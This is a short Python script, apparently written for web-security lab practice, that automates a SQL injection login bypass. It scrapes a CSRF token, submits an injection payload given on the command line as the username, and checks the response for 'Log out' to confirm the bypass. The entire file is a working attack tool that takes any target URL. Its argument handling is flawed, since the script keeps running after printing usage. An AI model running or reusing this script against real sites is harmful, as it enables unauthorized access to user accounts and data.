import requests
import sys
import urllib3
from bs4 import BeautifulSoup       #Useful for parsing and analysing responses
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF token because the application is validating it's existance
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    # Now need to parse the response in order to obtain the csrf token - on the input element within the response
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    #print(csrf)
    return csrf
    
def exploit_sqli(s, url, sqli_payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": sqli_payload, "password": "justrandom"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False
    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("\n[-] Usage: %s <url> <sqli-payload>" % sys.argv[0])
        print('\n[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        
    #Persists certain request paramaters    
    s = requests.Session()
    
    if exploit_sqli(s, url, sqli_payload):
        print("\n[+] SQL Injection Was Successful!")
    else:
        print("\n[-] SQL Injection Failed!")